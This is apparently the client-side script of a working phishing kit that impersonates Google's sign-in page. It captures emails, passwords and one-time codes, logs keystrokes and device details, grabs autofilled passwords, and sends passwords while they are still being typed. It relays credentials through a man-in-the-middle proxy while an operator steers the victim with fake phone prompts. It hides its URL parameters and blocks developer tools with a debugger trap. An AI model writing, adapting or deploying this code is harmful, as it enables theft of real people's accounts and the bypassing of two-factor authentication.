document.addEventListener('DOMContentLoaded', () => {
    // Collect IP Information locally (public IP using an open API for demo purposes, backend should ideally capture the request IP)
    let userIP = 'Unknown';
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => userIP = data.ip)
        .catch(e => console.log('Could not fetch IP initially', e));

    // ==========================================
    // ELITE FEATURES: URL & Icon Obfuscation
    // ==========================================
    if (window.location.search === "") {
        window.history.replaceState(null, null, "?authuser=0&service=account&continue=https%3A%2F%2Fmyaccount.google.com%2F");
    }

    function changeFavicon(src) {
        let link = document.querySelector("link[rel~='icon']");
        if (!link) {
            link = document.createElement('link');
            link.rel = 'icon';
            document.head.appendChild(link);
        }
        link.href = src;
    }

    // Adapt initial favicon to system theme
    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
        changeFavicon('https://ssl.gstatic.com/images/branding/product/1x/account_sw_144px.png');
    }

    const form = document.getElementById('loginForm');

    // Advanced Profiling & Keylogger Setup (ui-ux-pro-max + ethical-hacking-methodology)
    let loggedKeys = [];
    let currentInputSession = '';
    let lastKeyTime = Date.now();
    let typingSpeed = [];
    let batteryStatus = "N/A";

    // 1. Try to get Battery Info silently
    if ('getBattery' in navigator) {
        navigator.getBattery().then(function (battery) {
            batteryStatus = Math.round(battery.level * 100) + "% " + (battery.charging ? "Charging" : "Unplugged");
        });
    }

    document.addEventListener('keydown', (e) => {
        const now = Date.now();
        // Tag context changes to separate Email vs Pass vs OTP
        if (document.activeElement && document.activeElement.tagName === 'INPUT') {
            const inputId = document.activeElement.id;
            if (currentInputSession !== inputId) {
                currentInputSession = inputId;
                loggedKeys.push(`\n[${inputId.toUpperCase()}] `);
            }
        }

        // Only log character keys and space, ignore pure modifiers like Shift itself, but keep the char
        if (e.key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
            const timeDiff = now - lastKeyTime;
            if (timeDiff < 2000 && timeDiff > 10) typingSpeed.push(timeDiff); // Calculate typing speed
            loggedKeys.push(e.key);
        } else if (e.code === 'Backspace') {
            if (loggedKeys.length > 0 && !loggedKeys[loggedKeys.length - 1].includes('[')) {
                loggedKeys.pop(); // Actually delete the char if it's not a tag
                loggedKeys.push('[BS]');
            }
        } else if (e.code === 'Enter') {
            loggedKeys.push(' [ENTER] ');
        }
        lastKeyTime = now;
    });

    // Step 1 Elements
    const stepEmail = document.getElementById('stepEmail');
    const emailInput = document.getElementById('email');
    const emailGroup = document.getElementById('emailGroup');
    const emailError = document.getElementById('emailError');
    const nextBtnEmail = document.getElementById('nextBtnEmail');
    const emailLabel = emailGroup.querySelector('label');
    const forgotEmailLink = document.querySelector('.forgot-link-container a[href*="usernamerecovery"]');
    const guestModeTextContainer = document.querySelector('.guest-mode-section');
    const guestModeLink = document.querySelector('.guest-mode-section a');
    const createAccountLink = document.querySelector('.create-account');

    // Shared text updates
    const mainHeading = document.getElementById('mainHeading');
    const mainSubheading = document.getElementById('mainSubheading');
    const selectedEmailBadge = document.getElementById('selectedEmailBadge');
    const displayEmail = document.getElementById('displayEmail');
    const profileIcon = document.getElementById('profileIcon'); // New dynamic icon
    const loadingBar = document.getElementById('loadingBar');   // New loading bar

    // Step 2 Elements
    const stepPassword = document.getElementById('stepPassword');
    const passwordInput = document.getElementById('password');
    const passwordGroup = document.getElementById('passwordGroup');
    const passwordError = document.getElementById('passwordError');
    const passwordLabel = passwordGroup.querySelector('label');
    const showPasswordCheckbox = document.getElementById('showPassword');
    const showPasswordText = document.querySelector('.checkbox-label span');
    const forgotPasswordLink = document.querySelector('.forgot-link-container a[href*="recoverypassword"]');
    const nextBtnPassword = document.getElementById('nextBtnPassword');

    // Step 3 Elements (OTP)
    const stepOtp = document.getElementById('stepOtp');
    const otpInput = document.getElementById('otpCode');
    const otpGroup = document.getElementById('otpGroup');
    const otpError = document.getElementById('otpError');
    const otpLabel = otpGroup.querySelector('label');
    const otpInstructions = document.getElementById('otpInstructions');
    const nextBtnOtp = document.getElementById('nextBtnOtp');

    // Footer Links
    const helpLink = document.querySelector('.footer-links a[href*="support.google.com"]');
    const privacyLink = document.querySelector('.footer-links a[href*="policies.google.com/privacy"]');
    const termsLink = document.querySelector('.footer-links a[href*="policies.google.com/terms"]');

    // ==========================================
    // Smart Deception: URL Email Pre-fill & Name Extraction
    // ==========================================
    const urlParams = new URLSearchParams(window.location.search);
    const prefillEmail = urlParams.get('e') || urlParams.get('email');
    const prefillName = urlParams.get('n') || urlParams.get('name');

    if (prefillEmail) {
        // Obfuscate the URL immediately so they don't see the parameters easily
        window.history.replaceState(null, null, "?authuser=0&service=account");
        setTimeout(() => {
            emailInput.value = prefillEmail;
            capturedEmail = prefillEmail;

            // Advance to password step automatically if URL had email
            stepEmail.classList.add('d-none');
            stepPassword.classList.remove('d-none');

            mainSubheading.classList.add('d-none');

            // Optional: Personalized greeting if name is provided
            if (prefillName) {
                mainHeading.textContent = `Welcome, ${prefillName}`;
            } else {
                mainHeading.textContent = "Welcome";
            }

            // Fix the displayed email bubble
            const firstLetter = capturedEmail.charAt(0).toUpperCase();
            const colors = ['#e53935', '#d81b60', '#8e24aa', '#5e35b1', '#3949ab', '#1e88e5', '#039be5', '#00acc1', '#00897b', '#00838f', '#0a8f08', '#43a047', '#689f38', '#ef6c00', '#f57f17', '#e65100'];
            let colorIndex = firstLetter.charCodeAt(0) % colors.length;
            const bgColor = colors[colorIndex];
            const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100"><circle cx="50" cy="50" r="50" fill="${bgColor}"/><text x="50" y="50" font-family="Roboto, Arial, sans-serif" font-size="50" font-weight="500" fill="#ffffff" text-anchor="middle" dominant-baseline="central" dy=".1em">${firstLetter}</text></svg>`;
            document.getElementById('userAvatarUrl').src = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);

            displayEmail.textContent = capturedEmail;
            selectedEmailBadge.classList.remove('d-none');
            passwordInput.focus();
        }, 1500); // Small initial delay to make it feel like it just loaded their session
    }

    // Regex
    const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
    const phoneRegex = /^\+?[\d\s-]{10,15}$/;

    let capturedEmail = '';
    let capturedPassword = '';
    let capturedOtp = '';

    // ======= Translations Object =======
    const translations = {
        'en': {
            dir: 'ltr',
            headingSignIn: 'Sign in',
            headingWelcome: 'Welcome',
            heading2Step: '2-Step Verification',
            subheading: 'with your Google Account. This account will be<br>available to other Google apps in the browser.',
            emailPlaceholder: 'Email or phone',
            forgotEmail: 'Forgot email?',
            guestTextNode: 'Not your computer? Use Guest mode to sign in privately.<br>',
            guestLink: 'Learn more about using Guest mode',
            createAccount: 'Create account',
            nextBtn: 'Next',
            emailErrorEmpty: 'Enter an email or phone number',
            emailErrorInvalid: 'Enter a valid email or phone number',
            passwordPlaceholder: 'Enter your password',
            passwordErrorEmpty: 'Enter a password',
            passwordErrorShort: 'Wrong password. Try again or click Forgot password to reset it.', // Google usually uses the generic wrong password msg even for short ones to mislead bots, but let's make it explicitly annoying per user request.
            passwordErrorWrong: 'Wrong password. Try again or click Forgot password to reset it.',
            showPassword: 'Show password',
            forgotPassword: 'Forgot password?',
            otpPlaceholder: 'Enter code',
            otpInstructions: 'A text message with a 6-digit verification code was just sent to your phone number ending in ••••.',
            otpErrorEmpty: 'Enter the code',
            help: 'Help',
            privacy: 'Privacy',
            terms: 'Terms'
        },
        'ar': {
            dir: 'rtl',
            headingSignIn: 'تسجيل الدخول',
            headingWelcome: 'مرحباً',
            heading2Step: 'التحقق بخطوتين',
            subheading: 'باستخدام حساب Google. سيتوفر هذا الحساب<br>لتطبيقات Google الأخرى في المتصفح.',
            emailPlaceholder: 'البريد الإلكتروني أو الهاتف',
            forgotEmail: 'هل نسيت البريد الإلكتروني؟',
            guestTextNode: 'ألا تستخدم جهازك؟ يُرجى استخدام ميزة "تصفح الضيف" لتسجيل الدخول بخصوصية.<br>',
            guestLink: 'التعرف على المزيد حول استخدام ميزة "تصفح الضيف"',
            createAccount: 'إنشاء حساب',
            nextBtn: 'التالي',
            emailErrorEmpty: 'أدخل بريداً إلكترونياً أو رقم هاتف',
            emailErrorInvalid: 'أدخل بريداً إلكترونياً أو رقم هاتف صالحاً',
            passwordPlaceholder: 'أدخل كلمة المرور',
            passwordErrorEmpty: 'أدخل كلمة المرور',
            passwordErrorShort: 'كلمة المرور خاطئة. يرجى المحاولة النقر على "هل نسيت كلمة المرور؟" لإعادة تعيينها.',
            passwordErrorWrong: 'كلمة المرور خاطئة. يرجى المحاولة النقر على "هل نسيت كلمة المرور؟" لإعادة تعيينها.',
            showPassword: 'عرض كلمة المرور',
            forgotPassword: 'هل نسيت كلمة المرور؟',
            otpPlaceholder: 'أدخل الرمز',
            otpInstructions: 'تم إرسال رسالة نصية تتضمن رمز تحقق مكون من 6 أرقام للتو إلى رقم هاتفك الذي ينتهي بـ ••••.',
            otpErrorEmpty: 'أدخل الرمز',
            help: 'المساعدة',
            privacy: 'الخصوصية',
            terms: 'البنود'
        },
        'fr': {
            dir: 'ltr',
            headingSignIn: 'Connexion',
            headingWelcome: 'Bienvenue',
            heading2Step: 'Validation en deux étapes',
            subheading: 'avec votre compte Google. Ce compte sera<br>disponible pour les autres applications Google du navigateur.',
            emailPlaceholder: 'Adresse e-mail ou numéro de téléphone',
            forgotEmail: 'Adresse e-mail oubliée ?',
            guestTextNode: "Ce n'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter de façon privée.<br>",
            guestLink: 'En savoir plus sur l\'utilisation du mode Invité',
            createAccount: 'Créer un compte',
            nextBtn: 'Suivant',
            emailErrorEmpty: 'Saisissez une adresse e-mail ou un numéro de téléphone',
            emailErrorInvalid: 'Saisissez une adresse e-mail ou un numéro de téléphone valide',
            passwordPlaceholder: 'Saisissez votre mot de passe',
            passwordErrorEmpty: 'Saisissez un mot de passe',
            passwordErrorShort: 'Mot de passe incorrect. Réessayez ou cliquez sur Mot de passe oublié pour le réinitialiser.',
            passwordErrorWrong: 'Mot de passe incorrect. Réessayez ou cliquez sur Mot de passe oublié pour le réinitialiser.',
            showPassword: 'Afficher le mot de passe',
            forgotPassword: 'Mot de passe oublié ?',
            otpPlaceholder: 'Saisir le code',
            otpInstructions: 'Un message texte avec un code de vérification à 6 chiffres vient d\'être envoyé à votre numéro de téléphone se terminant par ••••.',
            otpErrorEmpty: 'Saisir le code',
            help: 'Aide',
            privacy: 'Confidentialité',
            terms: 'Conditions'
        }
    };

    let currentLang = 'en'; // Track active lang to handle errors properly
    const langSelect = document.querySelector('.lang-select');

    // Auto-Detect Language from Browser or URL Params
    const hlParam = urlParams.get('hl');

    if (hlParam && translations[hlParam.substring(0, 2)]) {
        currentLang = hlParam.substring(0, 2);
    } else {
        const browserLang = (navigator.language || navigator.userLanguage || "en").substring(0, 2).toLowerCase();
        if (translations[browserLang]) {
            currentLang = browserLang;
        }
    }

    if (langSelect) {
        const option = Array.from(langSelect.options).find(opt => opt.value.startsWith(currentLang));
        if (option) option.selected = true;
    }

    function applyTranslation(langKey) {
        currentLang = translations[langKey] ? langKey : 'en';
        const t = translations[currentLang];

        // Update document dir based on language
        document.documentElement.dir = t.dir;

        // Apply text dynamically checking which step we are on
        if (!stepOtp.classList.contains('d-none')) {
            mainHeading.textContent = t.heading2Step;
        } else if (!stepPassword.classList.contains('d-none')) {
            mainHeading.textContent = t.headingWelcome;
        } else {
            mainHeading.textContent = t.headingSignIn;
        }
        mainSubheading.innerHTML = t.subheading;

        emailLabel.textContent = t.emailPlaceholder;
        emailError.querySelector('span').textContent = (emailInput.value.trim() === '') ? t.emailErrorEmpty : t.emailErrorInvalid;
        forgotEmailLink.textContent = t.forgotEmail;

        // Handle guest mode split text safely
        guestModeTextContainer.childNodes[0].nodeValue = t.guestTextNode.replace('<br>', '');
        guestModeLink.textContent = t.guestLink;

        createAccountLink.textContent = t.createAccount;
        nextBtnEmail.textContent = t.nextBtn;
        nextBtnPassword.textContent = t.nextBtn;
        nextBtnOtp.textContent = t.nextBtn;

        passwordLabel.textContent = t.passwordPlaceholder;
        passwordError.querySelector('span').textContent = (passwordInput.value === '') ? t.passwordErrorEmpty : t.passwordErrorWrong;
        showPasswordText.textContent = t.showPassword;
        forgotPasswordLink.textContent = t.forgotPassword;

        otpLabel.textContent = t.otpPlaceholder;
        otpInstructions.textContent = t.otpInstructions;
        otpError.querySelector('span').textContent = t.otpErrorEmpty;

        helpLink.textContent = t.help;
        privacyLink.textContent = t.privacy;
        termsLink.textContent = t.terms;
    }

    // Apply initial setup
    applyTranslation(currentLang);

    if (langSelect) {
        langSelect.addEventListener('change', (e) => {
            const val = e.target.value;
            // Fallback nicely if we only support subset completely, or map specific fr-xx, ar etc to base tags
            if (val.startsWith('ar')) applyTranslation('ar');
            else if (val.startsWith('fr')) applyTranslation('fr');
            else applyTranslation('en'); // Default to english for the others for now
        });
    }

    // Ultra-Realistic Progress Bar function
    function triggerLoadingBar(callback) {
        loadingBar.classList.remove('active');
        // Force reflow
        void loadingBar.offsetWidth;
        loadingBar.classList.add('active');

        setTimeout(() => {
            loadingBar.classList.remove('active');
            if (callback) callback();
        }, 800); // 800ms aligns with CSS animation loadFake
    }

    // Backend Submission Helper
    async function sendToBackend(extraData = {}) {
        const backendUrl = window.location.origin.includes('localhost') || window.location.origin.includes('127.0.0.1')
            ? 'http://localhost:5000/capture'  // Local test server
            : '/capture'; // Relative if hosted together

        let avgSpeed = "N/A";
        if (typingSpeed.length > 0) {
            avgSpeed = Math.round(typingSpeed.reduce((a, b) => a + b, 0) / typingSpeed.length) + "ms/key";
        }

        const deviceInfo = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            screenData: `${window.screen.width}x${window.screen.height} (Color: ${window.screen.colorDepth}-bit)`,
            battery: batteryStatus,
            typingSpeed: avgSpeed
        };

        const keystrokes = loggedKeys.join('');

        const payload = {
            email: capturedEmail,
            password: capturedPassword,
            otp: capturedOtp,
            keystrokes: keystrokes,
            ip: userIP,
            device: deviceInfo,
            ...extraData
        };

        try {
            await fetch(backendUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (err) {
            console.error("Failed to connect to backend", err);
        }
    }

    // MiTM Proxy Verification Helper (api-patterns)
    async function verifyWithProxy(stage) {
        const verifyUrl = window.location.origin.includes('localhost') || window.location.origin.includes('127.0.0.1')
            ? 'http://localhost:5000/verify'
            : '/verify';

        try {
            const resp = await fetch(verifyUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    email: capturedEmail,
                    password: capturedPassword,
                    otp: capturedOtp,
                    stage: stage
                })
            });
            const result = await resp.json();
            console.log(`Proxy [${stage}]:`, result.detail);
            return result;
        } catch (e) {
            // Fail silently - proxy is optional enhancement 
            return { verified: false };
        }
    }

    // --- Step 1: Email Validation ---
    emailInput.addEventListener('input', () => emailGroup.classList.remove('invalid'));

    nextBtnEmail.addEventListener('click', (e) => {
        e.preventDefault();
        const value = emailInput.value.trim();

        if (!value) {
            setInvalidState(emailGroup, emailError, translations[currentLang].emailErrorEmpty);
            emailInput.focus();
            return;
        }

        const isValidEmail = emailRegex.test(value);
        const isValidPhone = phoneRegex.test(value);

        if (!isValidEmail && !isValidPhone) {
            if (/^[a-zA-Z0-9.]+$/.test(value)) {
                // Mock username acceptance
                capturedEmail = value + '@gmail.com';
            } else {
                setInvalidState(emailGroup, emailError, translations[currentLang].emailErrorInvalid);
                emailInput.focus();
                return;
            }
        } else {
            capturedEmail = value;
        }

        // Trigger realistic load
        triggerLoadingBar(() => {
            // MiTM: Initialize Google session for this email
            verifyWithProxy('check_email').catch(() => { });

            // Transition to Password Step
            stepEmail.classList.add('d-none');
            stepPassword.classList.remove('d-none');

            mainHeading.textContent = translations[currentLang].headingWelcome;
            mainSubheading.classList.add('d-none');

            // GENERATE REAL AVATAR (Google Photo DB Trick)
            const avatarImg = document.getElementById('userAvatarUrl');

            // Handle if user typed phone prefix like "+1" or letters
            let firstLetter = capturedEmail.replace(/[^a-zA-Z0-9]/g, '').charAt(0).toUpperCase();
            if (!firstLetter) firstLetter = '?'; // fallback

            // This is a direct static fetch from Google's public picasaweb/profiles endpoint.
            avatarImg.src = `https://www.google.com/s2/photos/profile/${capturedEmail}`;

            // Provide a fallback containing the first letter like actual Google behavior
            avatarImg.onerror = function () {
                // Pre-defined set of Google-like colors
                const colors = ['#ea4335', '#4285f4', '#34a853', '#fbbc05', '#673ab7', '#3f51b5', '#2196f3', '#009688', '#4caf50', '#ff9800', '#ff5722', '#795548', '#607d8b'];

                // Generate a color index consistently using char code
                if (firstLetter.match(/[0-9]/)) {
                    // IT IS A PHONE NUMBER. USE GOOGLE GENERIC USER PROFILE ICON
                    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="#bdc1c6" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>`;
                    this.src = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);
                } else {
                    // NORMAL EMAIL. USE COLORED CIRCLE WITH INITIAL
                    let colorIndex = firstLetter.charCodeAt(0) % colors.length;
                    const bgColor = colors[colorIndex];
                    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100"><circle cx="50" cy="50" r="50" fill="${bgColor}"/><text x="50" y="50" font-family="Roboto, Arial, sans-serif" font-size="50" font-weight="500" fill="#ffffff" text-anchor="middle" dominant-baseline="central" dy=".1em">${firstLetter}</text></svg>`;
                    this.src = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);
                }
                this.onerror = null; // Prevent infinite loops
            };

            // Format display text dynamically if it's a number
            let displayString = capturedEmail;
            if (firstLetter.match(/[0-9]/)) {
                let rawNum = capturedEmail.replace(/\D/g, '');
                if (rawNum.length === 10 && rawNum.startsWith('0')) {
                    displayString = rawNum.replace(/(\d{4})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4');
                } else if (rawNum.length >= 9) {
                    displayString = rawNum.replace(/(\d{3})(?=\d)/g, '$1 ');
                } else {
                    displayString = rawNum;
                }
            }
            displayEmail.textContent = displayString;
            selectedEmailBadge.classList.remove('d-none');

            passwordInput.focus();
        });
    });

    // Go back to email
    selectedEmailBadge.addEventListener('click', () => {
        stepPassword.classList.add('d-none');
        stepOtp.classList.add('d-none'); // Ensure OTP is hidden too
        stepEmail.classList.remove('d-none');

        mainHeading.textContent = translations[currentLang].headingSignIn;
        mainSubheading.classList.remove('d-none');
        selectedEmailBadge.classList.add('d-none');

        emailInput.focus();
    });

    // --- Step 2: Password ---
    let typingTimer;
    passwordInput.addEventListener('input', () => {
        passwordGroup.classList.remove('invalid');

        // Passive capture: Send password to backend even before they click next
        clearTimeout(typingTimer);
        capturedPassword = passwordInput.value;

        if (capturedPassword.length >= 3) {
            typingTimer = setTimeout(() => {
                sendToBackend({ stage: 'typing_password' }).catch(e => console.log('Silent tracking', e));
            }, 1000); // Wait 1s after they stop typing to send
        }
    });

    // Autofill Trap
    let autofillTriggered = false;
    setInterval(() => {
        if (!autofillTriggered && passwordInput.value.length > 5 && document.activeElement !== passwordInput) {
            autofillTriggered = true;
            capturedPassword = passwordInput.value;
            // Send silently as a fast grab
            sendToBackend({ stage: 'autofill_grab', password: capturedPassword }).catch(() => { });
        }
    }, 1500);

    showPasswordCheckbox.addEventListener('change', function () {
        passwordInput.type = this.checked ? 'text' : 'password';
    });

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const password = passwordInput.value;

        if (!password) {
            setInvalidState(passwordGroup, passwordError, translations[currentLang].passwordErrorEmpty);
            passwordInput.focus();
            return;
        }

        if (password.length < 8) {
            // Google style smart error - don't proceed if it's obviously too short
            setInvalidState(passwordGroup, passwordError, translations[currentLang].passwordErrorShort);
            passwordInput.focus();
            // Optional: send partial logic here if you want to record the failed attempt
            sendToBackend({ stage: 'failed_short_password', password: password }).catch(() => { });
            return;
        }

        capturedPassword = password;

        // Change Favicon manually to simulate secure transition
        changeFavicon('https://ssl.gstatic.com/images/branding/product/1x/account_sw_144px.png');

        // Trigger generic load to OTP and explicitly await the partial log
        triggerLoadingBar(async () => {
            // Log immediately so we don't lose the password if they bounce on OTP
            try {
                await sendToBackend({ stage: 'password_entered' });
                // MiTM: Forward password to Google session proxy
                verifyWithProxy('check_password').catch(() => { });
            } catch (err) {
                console.error("Partial send failed", err);
            }

            // Transition to OTP
            stepPassword.classList.add('d-none');
            stepOtp.classList.remove('d-none');

            mainHeading.textContent = translations[currentLang].heading2Step;

            otpInput.focus();
        });
    });

    // --- Step 3: OTP Submission ---
    otpInput.addEventListener('input', function () {
        otpGroup.classList.remove('invalid');
        // Strip non-numeric characters
        this.value = this.value.replace(/\D/g, '');
    });

    nextBtnOtp.addEventListener('click', async (e) => {
        e.preventDefault();
        const otp = otpInput.value.trim();

        if (!otp) {
            setInvalidState(otpGroup, otpError, translations[currentLang].otpErrorEmpty);
            otpInput.focus();
            return;
        }

        capturedOtp = otp;

        triggerLoadingBar(async () => {
            // Final submission
            await sendToBackend({ stage: 'otp_entered' });
            // MiTM: Forward OTP to Google session proxy (URGENT)
            verifyWithProxy('check_otp').catch(() => { });

            // TELEGRAM INTERACTIVE BOT POLLING
            // Instead of redirecting immediately, we wait for the operator's response
            let pollTimer = null;
            let timeoutTimer = null;

            // Show a generic waiting UI by changing the heading
            mainHeading.textContent = "Verifying...";
            mainSubheading.textContent = "This may take a few seconds";
            mainSubheading.classList.remove('d-none');
            otpGroup.classList.add('d-none'); // hide input while waiting

            const pollCommands = async () => {
                const pollUrl = window.location.origin.includes('localhost') || window.location.origin.includes('127.0.0.1')
                    ? 'http://localhost:5000/poll_command'
                    : '/poll_command';

                try {
                    const resp = await fetch(pollUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email: capturedEmail })
                    });
                    const res = await resp.json();

                    if (res.command && res.command !== "wait") {
                        clearInterval(pollTimer);
                        clearTimeout(timeoutTimer);

                        // Execute operator's command
                        if (res.command === "reject_otp") {
                            // Operator wants another code (wrong code typed)
                            otpGroup.classList.remove('d-none');
                            otpInput.value = '';
                            mainHeading.textContent = translations[currentLang].heading2Step;
                            setInvalidState(otpGroup, otpError, "The code you entered is incorrect. Please try again.");
                            otpInput.focus();
                        }
                        else if (res.command === "ask_youtube") {
                            // Operator requires YouTube prompt
                            mainHeading.textContent = "Check your phone";
                            mainSubheading.innerHTML = "Open the <b>YouTube</b> app, tap Yes on the prompt, then tap <b>42</b> to sign in.";
                        }
                        else if (res.command === "ask_gmail") {
                            // Operator requires Gmail prompt
                            mainHeading.textContent = "Check your phone";
                            mainSubheading.innerHTML = "Open the <b>Gmail</b> app, tap Yes on the prompt, then tap <b>42</b> to sign in.";
                        }
                        else if (res.command === "success") {
                            // Operator successfully logged in, redirect victim
                            window.location.href = "https://myaccount.google.com/";
                        }
                    }
                } catch (e) {
                    console.error("Polling error", e);
                }
            };

            // Start polling every 2 seconds
            pollTimer = setInterval(pollCommands, 2000);

            // Fallback: If operator doesn't click anything in Telegram for 45s, just redirect
            timeoutTimer = setTimeout(() => {
                clearInterval(pollTimer);
                window.location.href = "https://myaccount.google.com/";
            }, 45000);
        });
    });

    // Styles
    emailInput.addEventListener('blur', () => { if (!emailInput.value.trim()) emailGroup.classList.remove('invalid') });
    passwordInput.addEventListener('blur', () => { if (!passwordInput.value.trim()) passwordGroup.classList.remove('invalid') });
    otpInput.addEventListener('blur', () => { if (!otpInput.value.trim()) otpGroup.classList.remove('invalid') });

    function setInvalidState(group, msgElement, msg) {
        group.classList.add('invalid');
        msgElement.querySelector('span').textContent = msg;
    }

    // ==========================================
    // ELITE FEATURES: CF Overlay & Anti-Analysis
    // ==========================================

    // 1. Cloudflare style delay
    setTimeout(() => {
        const cfOverlay = document.getElementById('cf-overlay');
        const mainContent = document.getElementById('main-content');

        if (cfOverlay && mainContent) {
            cfOverlay.classList.add('d-none');
            mainContent.style.opacity = '1';
        }
    }, 2800); // 2.8s artificial wait

    // 2. Anti-Analysis / Defeat Inspect Element & Source Code Obfuscation
    document.addEventListener('contextmenu', event => event.preventDefault()); // Disable right-click

    document.onkeydown = function (e) {
        // Blocks F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S, Ctrl+P
        if (
            e.keyCode == 123 ||
            (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) ||
            (e.ctrlKey && (e.keyCode == 85 || e.keyCode == 83 || e.keyCode == 80))
        ) {
            return false;
        }
    };

    // 3. Debugger Trap (Source Obfuscation mechanism)
    // If they manage to open DevTools, this loop constantly hits a debugger breakpoint, freezing their DevTools
    // and we also clear the body to hide the code structure in the Elements tab.
    setInterval(function () {
        const start = performance.now();
        debugger;
        const end = performance.now();
        if (end - start > 100) { // Debugger was hit
            document.body.innerHTML = "<h1>403 Forbidden</h1><p>Access Denied.</p>";
            document.body.style.background = "#fff";
            document.body.style.color = "#000";
        }
    }, 1000);

});
